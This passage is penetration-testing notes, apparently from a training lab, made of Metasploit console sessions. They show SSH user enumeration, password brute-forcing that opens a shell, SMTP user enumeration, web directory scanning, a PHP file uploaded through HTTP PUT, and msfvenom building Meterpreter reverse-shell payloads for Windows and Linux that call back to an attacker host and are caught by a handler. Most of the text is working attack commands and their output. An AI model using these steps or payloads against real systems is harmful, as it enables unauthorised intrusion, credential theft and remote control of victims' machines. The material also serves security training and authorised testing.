msf5 auxiliary(scanner/ssh/ssh_version) > setg RHOSTS 192.79.5.3
RHOSTS => 192.79.5.3
msf5 auxiliary(scanner/ssh/ssh_version) > options

Module options (auxiliary/scanner/ssh/ssh_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   192.79.5.3       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    22               yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)
   TIMEOUT  30               yes       Timeout for the SSH probe

msf5 auxiliary(scanner/ssh/ssh_version) > run

[+] 192.79.5.3:22         - SSH server version: SSH-2.0-OpenSSH_7.9p1 Ubuntu-10 ( service.version=7.9p1 openssh.comment=Ubuntu-10 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:7.9p1 os.vendor=Ubuntu os.family=Linux os.product=Linux os.version=19.04 os.cpe23=cpe:/o:canonical:ubuntu_linux:19.04 service.protocol=ssh fingerprint_db=ssh.banner )
[*] 192.79.5.3:22         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```bash
msf5 auxiliary(scanner/ssh/ssh_version) > use auxiliary/scanner/ssh/ssh_enumusers
msf5 auxiliary(scanner/ssh/ssh_enumusers) > options

Module options (auxiliary/scanner/ssh/ssh_enumusers):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CHECK_FALSE  false            no        Check for false positives (random username)
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       192.79.5.3       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        22               yes       The target port
   THREADS      1                yes       The number of concurrent threads (max one per host)
   THRESHOLD    10               yes       Amount of seconds needed before a user is considered found (timing attack only)
   USERNAME                      no        Single username to test (username spray)
   USER_FILE                     no        File containing usernames, one per line


Auxiliary action:

   Name              Description
   ----              -----------
   Malformed Packet  Use a malformed packet


msf5 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5 auxiliary(scanner/ssh/ssh_enumusers) > run

[*] 192.79.5.3:22 - SSH - Using malformed packet technique
[*] 192.79.5.3:22 - SSH - Starting scan
[+] 192.79.5.3:22 - SSH - User 'sysadmin' found
[+] 192.79.5.3:22 - SSH - User 'rooty' found
[+] 192.79.5.3:22 - SSH - User 'demo' found
[+] 192.79.5.3:22 - SSH - User 'auditor' found
[+] 192.79.5.3:22 - SSH - User 'anon' found
[+] 192.79.5.3:22 - SSH - User 'administrator' found
[+] 192.79.5.3:22 - SSH - User 'diag' found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```bash
msf5 auxiliary(scanner/ssh/ssh_enumusers) > use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) > options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS            192.79.5.3       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ssh/ssh_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/common_passwords.txt

msf5 auxiliary(scanner/ssh/ssh_login) > run

[+] 192.79.5.3:22 - Success: 'sysadmin:hailey' ''
[*] Command shell session 1 opened (192.79.5.2:46799 -> 192.79.5.3:22) at 2024-02-02 13:08:04 +0000
^C[*] Caught interrupt from the console...
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type           Information                          Connection
  --  ----  ----           -----------                          ----------
  1         shell unknown  SSH sysadmin:hailey (192.79.5.3:22)  192.79.5.2:46799 -> 192.79.5.3:22 (192.79.5.3)

msf5 auxiliary(scanner/ssh/ssh_login) > sessions 1
[*] Starting interaction with 1...

Welcome to Ubuntu 19.04 (GNU/Linux 5.4.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

id
uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin)
```

### SMTP Enum

```bash
msf5 > use auxiliary/scanner/smtp/smtp_version
msf5 auxiliary(scanner/smtp/smtp_version) > options

Module options (auxiliary/scanner/smtp/smtp_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   192.250.28.3     yes       The target address range or CIDR identifier
   RPORT    25               yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads

msf5 auxiliary(scanner/smtp/smtp_version) > run

[+] 192.250.28.3:25       - 192.250.28.3:25 SMTP 220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server.\x0d\x0a
[*] 192.250.28.3:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```bash
msf5 auxiliary(scanner/smtp/smtp_version) > use auxiliary/scanner/smtp/smtp_relay
msf5 auxiliary(scanner/smtp/smtp_relay) > options

Module options (auxiliary/scanner/smtp/smtp_relay):

   Name      Current Setting     Required  Description
   ----      ---------------     --------  -----------
   EXTENDED  false               yes       Do all the 16 extended checks
   MAILFROM  sender@example.com  yes       FROM address of the e-mail
   MAILTO    target@example.com  yes       TO address of the e-mail
   RHOSTS    192.250.28.3        yes       The target address range or CIDR identifier
   RPORT     25                  yes       The target port (TCP)
   THREADS   1                   yes       The number of concurrent threads

msf5 auxiliary(scanner/smtp/smtp_relay) > run

[+] 192.250.28.3:25       - SMTP 220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server.\x0d\x0a
[*] 192.250.28.3:25       - No relay detected
[*] 192.250.28.3:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
```bash
msf5 auxiliary(scanner/smtp/smtp_relay) > use auxiliary/scanner/smtp/smtp_enum
msf5 auxiliary(scanner/smtp/smtp_enum) > options

Module options (auxiliary/scanner/smtp/smtp_enum):

   Name       Current Setting                                                Required  Description
   ----       ---------------                                                --------  -----------
   RHOSTS     192.250.28.3                                                   yes       The target address range or CIDR identifier
   RPORT      25                                                             yes       The target port (TCP)
   THREADS    1                                                              yes       The number of concurrent threads
   UNIXONLY   true                                                           yes       Skip Microsoft bannered servers when testing unix users
   USER_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of probable users accounts.

msf5 auxiliary(scanner/smtp/smtp_enum) > run

[*] 192.250.28.3:25       - 192.250.28.3:25 Banner: 220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server.
[+] 192.250.28.3:25       - 192.250.28.3:25 Users found: , admin, administrator, backup, bin, daemon, games, gnats, irc, list, lp, mail, man, news, nobody, postmaster, proxy, sync, sys, uucp, www-data
[*] 192.250.28.3:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Vulnerability Scanning

[Autopwn](https://github.com/hahwul/metasploit-autopwn)

```bash
msf6 > db_autopwn -p -t -PI 445
```

```bash
msf5 > load wmap

.-.-.-..-.-.-..---..---.
| | | || | | || | || |-'
`-----'`-'-'-'`-^-'`-'
[WMAP 1.5.1] ===  et [  ] metasploit.com 2012
[*] Successfully loaded plugin: wmap
msf5 > wmap_sites -h
[*] Usage: wmap_sites [options]
        -h        Display this help text
        -a [url]  Add site (vhost,url)
        -d [ids]  Delete sites (separate ids with space)
        -l        List all available sites
        -s [id]   Display site structure (vhost,url|ids) (level) (unicode output true/false)

msf5 > wmap_sites -a 192.206.183.3
[*] Site created.
msf5 > wmap_targets -h
[*] Usage: wmap_targets [options]
        -h              Display this help text
        -t [urls]       Define target sites (vhost1,url[space]vhost2,url)
        -d [ids]        Define target sites (id1, id2, id3 ...)
        -c              Clean target sites list
        -l              List all target sites

msf5 > wmap_targets -t http://192.206.183.3/
msf5 > wmap_run -t
[*] Testing target:
[*]     Site: 192.206.183.3 (192.206.183.3)
[*]     Port: 80 SSL: false
============================================================
[*] Testing started. 2024-02-06 00:47:32 +0000
[*]
=[ SSL testing ]=
============================================================
[*] Target is not SSL. SSL modules disabled.
[*]
=[ Web Server testing ]=
============================================================
[*] Module auxiliary/scanner/http/http_version
[*] Module auxiliary/scanner/http/open_proxy
[*] Module auxiliary/admin/http/tomcat_administration
[*] Module auxiliary/admin/http/tomcat_utf8_traversal
[*] Module auxiliary/scanner/http/drupal_views_user_enum
[*] Module auxiliary/scanner/http/frontpage_login
[*] Module auxiliary/scanner/http/host_header_injection
[*] Module auxiliary/scanner/http/options
[*] Module auxiliary/scanner/http/robots_txt
[*] Module auxiliary/scanner/http/scraper
[*] Module auxiliary/scanner/http/svn_scanner
[*] Module auxiliary/scanner/http/trace
[*] Module auxiliary/scanner/http/vhost_scanner
[*] Module auxiliary/scanner/http/webdav_internal_ip
[*] Module auxiliary/scanner/http/webdav_scanner
[*] Module auxiliary/scanner/http/webdav_website_content
[*]
=[ File/Dir testing ]=
============================================================
[*] Module auxiliary/scanner/http/backup_file
[*] Module auxiliary/scanner/http/brute_dirs
[*] Module auxiliary/scanner/http/copy_of_file
[*] Module auxiliary/scanner/http/dir_listing
[*] Module auxiliary/scanner/http/dir_scanner
[*] Module auxiliary/scanner/http/dir_webdav_unicode_bypass
[*] Module auxiliary/scanner/http/file_same_name_dir
[*] Module auxiliary/scanner/http/files_dir
[*] Module auxiliary/scanner/http/http_put
[*] Module auxiliary/scanner/http/ms09_020_webdav_unicode_bypass
[*] Module auxiliary/scanner/http/prev_dir_same_name_file
[*] Module auxiliary/scanner/http/replace_ext
[*] Module auxiliary/scanner/http/soap_xml
[*] Module auxiliary/scanner/http/trace_axd
[*] Module auxiliary/scanner/http/verb_auth_bypass
[*]
=[ Unique Query testing ]=
============================================================
[*] Module auxiliary/scanner/http/blind_sql_query
[*] Module auxiliary/scanner/http/error_sql_injection
[*] Module auxiliary/scanner/http/http_traversal
[*] Module auxiliary/scanner/http/rails_mass_assignment
[*]
=[ Query testing ]=
============================================================
[*]
=[ General testing ]=
============================================================
[*] Done.

msf5 > wmap_run -e
[*] Using ALL wmap enabled modules.
[-] NO WMAP NODES DEFINED. Executing local modules
[*] Testing target:
[*]     Site: 192.206.183.3 (192.206.183.3)
[*]     Port: 80 SSL: false
============================================================
[*] Testing started. 2024-02-06 00:48:37 +0000
[*]
=[ SSL testing ]=
============================================================
[*] Target is not SSL. SSL modules disabled.
[*]
=[ Web Server testing ]=
============================================================
[*] Module auxiliary/scanner/http/http_version

[+] 192.206.183.3:80 Apache/2.4.18 (Ubuntu)
[*] Module auxiliary/scanner/http/open_proxy
[*] Module auxiliary/admin/http/tomcat_administration
[*] Module auxiliary/admin/http/tomcat_utf8_traversal
[*] Attempting to connect to 192.206.183.3:80
[+] No File(s) found
[*] Module auxiliary/scanner/http/drupal_views_user_enum
[-] 192.206.183.3 does not appear to be vulnerable, will not continue
[*] Module auxiliary/scanner/http/frontpage_login
[*] 192.206.183.3:80      - http://192.206.183.3/ may not support FrontPage Server Extensions
[*] Module auxiliary/scanner/http/host_header_injection
[*] Module auxiliary/scanner/http/options
[+] 192.206.183.3 allows POST,OPTIONS,GET,HEAD methods
[*] Module auxiliary/scanner/http/robots_txt
[*] [192.206.183.3] /robots.txt found
[+] Contents of Robots.txt:
# robots.txt for attackdefense
User-agent: test
# Directories
Allow: /webmail

User-agent: *
# Directories
Disallow: /data
Disallow: /secure

[*] Module auxiliary/scanner/http/scraper
[+] [192.206.183.3] / [Apache2 Ubuntu Default Page: It works]
[*] Module auxiliary/scanner/http/svn_scanner
[*] Using code '404' as not found.
[*] Module auxiliary/scanner/http/trace
[*] Module auxiliary/scanner/http/vhost_scanner
[*] [192.206.183.3] Sending request with random domain cnsYV.
[*] [192.206.183.3] Sending request with random domain SgLIN.
[*] Module auxiliary/scanner/http/webdav_internal_ip
[*] Module auxiliary/scanner/http/webdav_scanner
[*] 192.206.183.3 (Apache/2.4.18 (Ubuntu)) WebDAV disabled.
[*] Module auxiliary/scanner/http/webdav_website_content
[*]
=[ File/Dir testing ]=
============================================================
[*] Module auxiliary/scanner/http/backup_file
[*] Module auxiliary/scanner/http/brute_dirs
[*] Path: /
[*] Using code '404' as not found.
[+] Found http://192.206.183.3:80/doc/ 200
[+] Found http://192.206.183.3:80/pro/ 200
[*] Module auxiliary/scanner/http/copy_of_file
[*] Module auxiliary/scanner/http/dir_listing
[*] Path: /
[*] Module auxiliary/scanner/http/dir_scanner
[*] Path: /
[*] Detecting error code
[*] Using code '404' as not found for 192.206.183.3
[+] Found http://192.206.183.3:80/cgi-bin/ 404 (192.206.183.3)
[+] Found http://192.206.183.3:80/data/ 404 (192.206.183.3)
[+] Found http://192.206.183.3:80/downloads/ 404 (192.206.183.3)
[+] Found http://192.206.183.3:80/doc/ 404 (192.206.183.3)
[+] Found http://192.206.183.3:80/icons/ 404 (192.206.183.3)
[+] Found http://192.206.183.3:80/manual/ 404 (192.206.183.3)
[+] Found http://192.206.183.3:80/secure/ 404 (192.206.183.3)
[+] Found http://192.206.183.3:80/users/ 200 (192.206.183.3)
[+] Found http://192.206.183.3:80/uploads/ 200 (192.206.183.3)
[+] Found http://192.206.183.3:80/view/ 404 (192.206.183.3)
[+] Found http://192.206.183.3:80/webadmin/ 404 (192.206.183.3)
[+] Found http://192.206.183.3:80/web_app/ 404 (192.206.183.3)
[+] Found http://192.206.183.3:80/webmail/ 200 (192.206.183.3)
[+] Found http://192.206.183.3:80/webdb/ 200 (192.206.183.3)
[+] Found http://192.206.183.3:80/webdav/ 200 (192.206.183.3)
[+] Found http://192.206.183.3:80/~admin/ 404 (192.206.183.3)
[+] Found http://192.206.183.3:80/~nobody/ 404 (192.206.183.3)
[*] Module auxiliary/scanner/http/dir_webdav_unicode_bypass
[*] Path: /
[*] Using code '404' as not found.
[*] Found protected folder http://192.206.183.3:80/secure/ 401 (192.206.183.3)
[*]     Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.
[*] Found protected folder http://192.206.183.3:80/webdav/ 401 (192.206.183.3)
[*]     Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.
[*] Module auxiliary/scanner/http/file_same_name_dir
[*] Path: /
[-] Blank or default PATH set.
[*] Module auxiliary/scanner/http/files_dir
[*] Path: /
[*] Using code '404' as not found for files with extension .null
[*] Using code '404' as not found for files with extension .backup
[+] Found http://192.206.183.3:80/file.backup 200
[*] Using code '404' as not found for files with extension .bak
[*] Using code '404' as not found for files with extension .c
[+] Found http://192.206.183.3:80/code.c 200
[*] Using code '404' as not found for files with extension .cfg
[+] Found http://192.206.183.3:80/code.cfg 200
[*] Using code '404' as not found for files with extension .class
[*] Using code '404' as not found for files with extension .copy
[*] Using code '404' as not found for files with extension .conf
[*] Using code '404' as not found for files with extension .exe
[*] Using code '404' as not found for files with extension .html
[+] Found http://192.206.183.3:80/index.html 200
[*] Using code '404' as not found for files with extension .htm
[*] Using code '404' as not found for files with extension .ini
[*] Using code '404' as not found for files with extension .log
[*] Using code '404' as not found for files with extension .old
[*] Using code '404' as not found for files with extension .orig
[*] Using code '404' as not found for files with extension .php
[+] Found http://192.206.183.3:80/test.php 200
[*] Using code '404' as not found for files with extension .tar
[*] Using code '404' as not found for files with extension .tar.gz
[*] Using code '404' as not found for files with extension .tgz
[*] Using code '404' as not found for files with extension .tmp
[*] Using code '404' as not found for files with extension .temp
[*] Using code '404' as not found for files with extension .txt
[*] Using code '404' as not found for files with extension .zip
[*] Using code '404' as not found for files with extension ~
[*] Using code '404' as not found for files with extension
[+] Found http://192.206.183.3:80/cgi-bin 301
[+] Found http://192.206.183.3:80/data 301
[+] Found http://192.206.183.3:80/downloads 301
[+] Found http://192.206.183.3:80/doc 301
[+] Found http://192.206.183.3:80/manual 301
[+] Found http://192.206.183.3:80/secure 401
[+] Found http://192.206.183.3:80/users 301
[+] Found http://192.206.183.3:80/uploads 301
[+] Found http://192.206.183.3:80/webdav 401
[+] Found http://192.206.183.3:80/view 301
[+] Found http://192.206.183.3:80/webadmin 301
[+] Found http://192.206.183.3:80/webmail 301
[+] Found http://192.206.183.3:80/~admin 403
[+] Found http://192.206.183.3:80/~bin 403
[+] Found http://192.206.183.3:80/~mail 403
[+] Found http://192.206.183.3:80/~sys 403
[*] Using code '404' as not found for files with extension
[+] Found http://192.206.183.3:80/cgi-bin 301
[+] Found http://192.206.183.3:80/data 301
[+] Found http://192.206.183.3:80/doc 301
[+] Found http://192.206.183.3:80/downloads 301
[+] Found http://192.206.183.3:80/manual 301
[+] Found http://192.206.183.3:80/secure 401
[+] Found http://192.206.183.3:80/users 301
[+] Found http://192.206.183.3:80/uploads 301
[+] Found http://192.206.183.3:80/view 301
[+] Found http://192.206.183.3:80/webdav 401
[+] Found http://192.206.183.3:80/webadmin 301
[+] Found http://192.206.183.3:80/webmail 301
[+] Found http://192.206.183.3:80/~admin 403
[+] Found http://192.206.183.3:80/~bin 403
[+] Found http://192.206.183.3:80/~mail 403
[+] Found http://192.206.183.3:80/~sys 403
[*] Module auxiliary/scanner/http/http_put
[*] Path: /
[-] 192.206.183.3: File doesn't seem to exist. The upload probably failed
[*] Module auxiliary/scanner/http/ms09_020_webdav_unicode_bypass
[*] Path: /
[-] 192.206.183.3:80 Folder does not require authentication. [405]
[*] Module auxiliary/scanner/http/prev_dir_same_name_file
[*] Path: /
[-] Blank or default PATH set.
[*] Module auxiliary/scanner/http/replace_ext
[*] Module auxiliary/scanner/http/soap_xml
[*] Path: /
[*] Starting scan with 0ms delay between requests
[*] Server 192.206.183.3:80 returned HTTP 404 for /.  Use a different one.
[*] Module auxiliary/scanner/http/trace_axd
[*] Path: /
[*] Module auxiliary/scanner/http/verb_auth_bypass
[*]
=[ Unique Query testing ]=
============================================================
[*] Module auxiliary/scanner/http/blind_sql_query
[*] Module auxiliary/scanner/http/error_sql_injection
[*] Module auxiliary/scanner/http/http_traversal
[*] Module auxiliary/scanner/http/rails_mass_assignment
[*]
=[ Query testing ]=
============================================================
[*]
=[ General testing ]=
============================================================
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Launch completed in 342.66355752944946 seconds.
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
[*] Done.


msf5 > wmap_vulns -l
[*] + [192.206.183.3] (192.206.183.3): scraper /
[*]     scraper Scraper
[*]     GET Apache2 Ubuntu Default Page: It works
[*] + [192.206.183.3] (192.206.183.3): directory /pro/
[*]     directory Directory found.
[*]     GET Res code: 200
[*] + [192.206.183.3] (192.206.183.3): directory /cgi-bin/
[*]     directory Directoy found.
[*]     GET Res code: 200
[*] + [192.206.183.3] (192.206.183.3): directory /data/
[*]     directory Directoy found.
[*]     GET Res code: 200
[*] + [192.206.183.3] (192.206.183.3): directory /downloads/
[*]     directory Directoy found.
[*]     GET Res code: 200
[*] + [192.206.183.3] (192.206.183.3): directory /doc/
[*]     directory Directoy found.
[*]     GET Res code: 200
[*] + [192.206.183.3] (192.206.183.3): directory /icons/
[*]     directory Directoy found.
[*]     GET Res code: 403
[*] + [192.206.183.3] (192.206.183.3): directory /manual/
[*]     directory Directoy found.
[*]     GET Res code: 200
[*] + [192.206.183.3] (192.206.183.3): directory /secure/
[*]     directory Directoy found.
[*]     GET Res code: 401
[*] + [192.206.183.3] (192.206.183.3): directory /users/
[*]     directory Directoy found.
[*]     GET Res code: 200
[*] + [192.206.183.3] (192.206.183.3): directory /uploads/
[*]     directory Directoy found.
[*]     GET Res code: 200
[*] + [192.206.183.3] (192.206.183.3): directory /webadmin/
[*]     directory Directoy found.
[*]     GET Res code: 200
[*] + [192.206.183.3] (192.206.183.3): directory /view/
[*]     directory Directoy found.
[*]     GET Res code: 200
[*] + [192.206.183.3] (192.206.183.3): directory /web_app/
[*]     directory Directoy found.
[*]     GET Res code: 200
[*] + [192.206.183.3] (192.206.183.3): directory /webmail/
[*]     directory Directoy found.
[*]     GET Res code: 200
[*] + [192.206.183.3] (192.206.183.3): directory /webdb/
[*]     directory Directoy found.
[*]     GET Res code: 200
[*] + [192.206.183.3] (192.206.183.3): directory /webdav/
[*]     directory Directoy found.
[*]     GET Res code: 401
[*] + [192.206.183.3] (192.206.183.3): directory /~admin/
[*]     directory Directoy found.
[*]     GET Res code: 403
[*] + [192.206.183.3] (192.206.183.3): directory /~nobody/
[*]     directory Directoy found.
[*]     GET Res code: 403
[*] + [192.206.183.3] (192.206.183.3): file /file.backup
[*]     file File found.
[*]     GET Res code: 200
[*] + [192.206.183.3] (192.206.183.3): file /code.c
[*]     file File found.
[*]     GET Res code: 404
[*] + [192.206.183.3] (192.206.183.3): file /code.cfg
[*]     file File found.
[*]     GET Res code: 200
[*] + [192.206.183.3] (192.206.183.3): file /index.html
[*]     file File found.
[*]     GET Res code: 200
[*] + [192.206.183.3] (192.206.183.3): file /test.php
[*]     file File found.
[*]     GET Res code: 404
[*] + [192.206.183.3] (192.206.183.3): file /cgi-bin
[*]     file File found.
[*]     GET Res code: 404
[*] + [192.206.183.3] (192.206.183.3): file /data
[*]     file File found.
[*]     GET Res code: 301
[*] + [192.206.183.3] (192.206.183.3): file /users
[*]     file File found.
[*]     GET Res code: 404
[*] + [192.206.183.3] (192.206.183.3): file /uploads
[*]     file File found.
[*]     GET Res code: 301
[*] + [192.206.183.3] (192.206.183.3): file /view
[*]     file File found.
[*]     GET Res code: 404
[*] + [192.206.183.3] (192.206.183.3): file /webadmin
[*]     file File found.
[*]     GET Res code: 404
[*] + [192.206.183.3] (192.206.183.3): file /webdav
[*]     file File found.
[*]     GET Res code: 401
[*] + [192.206.183.3] (192.206.183.3): file /webmail
[*]     file File found.
[*]     GET Res code: 301
[*] + [192.206.183.3] (192.206.183.3): file /~mail
[*]     file File found.
[*]     GET Res code: 404
[*] + [192.206.183.3] (192.206.183.3): file /downloads
[*]     file File found.
[*]     GET Res code: 404
[*] + [192.206.183.3] (192.206.183.3): file /doc
[*]     file File found.
[*]     GET Res code: 404
[*] + [192.206.183.3] (192.206.183.3): file /manual
[*]     file File found.
[*]     GET Res code: 301
[*] + [192.206.183.3] (192.206.183.3): file /secure
[*]     file File found.
[*]     GET Res code: 404
[*] + [192.206.183.3] (192.206.183.3): file /~admin
[*]     file File found.
[*]     GET Res code: 403
[*] + [192.206.183.3] (192.206.183.3): file /~bin
[*]     file File found.
[*]     GET Res code: 404
[*] + [192.206.183.3] (192.206.183.3): file /~sys
[*]     file File found.
[*]     GET Res code: 403
```

```bash
msf5 auxiliary(scanner/http/options) > use auxiliary/scanner/http/http_put
msf5 auxiliary(scanner/http/http_put) > options

Module options (auxiliary/scanner/http/http_put):

   Name      Current Setting        Required  Description
   ----      ---------------        --------  -----------
   ACTION    PUT                    yes       PUT or DELETE
   FILEDATA  msf test file          no        The data to upload into the file
   FILENAME  msf_http_put_test.txt  yes       The file to attempt to write or delete
   PATH      /                      yes       The path to attempt to write or delete
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    192.206.183.3          yes       The target address range or CIDR identifier
   RPORT     80                     yes       The target port (TCP)
   SSL       false                  no        Negotiate SSL/TLS for outgoing connections
   THREADS   1                      yes       The number of concurrent threads
   VHOST                            no        HTTP server virtual host


Auxiliary action:

   Name  Description
   ----  -----------
   PUT


msf5 auxiliary(scanner/http/http_put) > run

[-] 192.206.183.3: File doesn't seem to exist. The upload probably failed
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf5 auxiliary(scanner/http/http_put) > set PATH /data/
PATH => /data/
msf5 auxiliary(scanner/http/http_put) > run

[+] File uploaded: http://192.206.183.3:80/data/msf_http_put_test.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf5 auxiliary(scanner/http/http_put) > curl http://192.206.183.3:80/data/msf_http_put_test.txt;echo
[*] exec: curl http://192.206.183.3:80/data/msf_http_put_test.txt;echo

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    13  100    13    0     0  13000      0 --:--:-- --:--:-- --:--:-- 13000
msf test file
msf5 auxiliary(scanner/http/http_put) > set FILEDATA "<?php echo 'in';"
FILEDATA => <?php echo 'in';
msf5 auxiliary(scanner/http/http_put) > set FILENAME test.php
FILENAME => test.php
msf5 auxiliary(scanner/http/http_put) > run

[+] File uploaded: http://192.206.183.3:80/data/test.php
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf5 auxiliary(scanner/http/http_put) > curl http://192.206.183.3:80/data/test.php; echo
[*] exec: curl http://192.206.183.3:80/data/test.php; echo

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    16  100    16    0     0  16000      0 --:--:-- --:--:-- --:--:-- 16000
<?php echo 'in';
```

### Client Side Attacks

### msfvenom

```bash
$ msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe > /tmp/payloadx86.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes

$ msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe > /tmp/payloadx64.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes

$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.4 LPORT=4444 -f elf > /tmp/payloadLinuxx86
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes

$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.4 LPORT=4444 -f elf > /tmp/payloadLinuxx64
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
```

```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set LHOST 10.0.2.6
LHOST => 10.0.2.6
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.0.2.6:4444
[*] Sending stage (3045380 bytes) to 10.0.2.6
[*] Meterpreter session 1 opened (10.0.2.6:4444 -> 10.0.2.6:47906) at 2024-02-06 07:23:52 -0500

meterpreter > sysinfo
Computer     : 10.0.2.6
OS           : Debian  (Linux 6.6.9-amd64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```

### Encoding

```bash
$ msfvenom --list encoders

Framework Encoders [--encoder <value>]
======================================

    Name                          Rank       Description
    ----                          ----       -----------
    cmd/brace                     low        Bash Brace Expansion Command Encoder
    cmd/echo                      good       Echo Command Encoder
    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
    cmd/ifs                       low        Bourne ${IFS} Substitution Command Encoder
    cmd/perl                      normal     Perl Command Encoder
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
    generic/eicar                 manual     The EICAR Encoder
    generic/none                  normal     The "none" Encoder
    mipsbe/byte_xori              normal     Byte XORi Encoder
    mipsbe/longxor                normal     XOR Encoder
    mipsle/byte_xori              normal     Byte XORi Encoder
    mipsle/longxor                normal     XOR Encoder
    php/base64                    great      PHP Base64 Encoder
    ppc/longxor                   normal     PPC LongXOR Encoder
    ppc/longxor_tag               normal     PPC LongXOR Encoder
    ruby/base64                   great      Ruby Base64 Encoder
    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
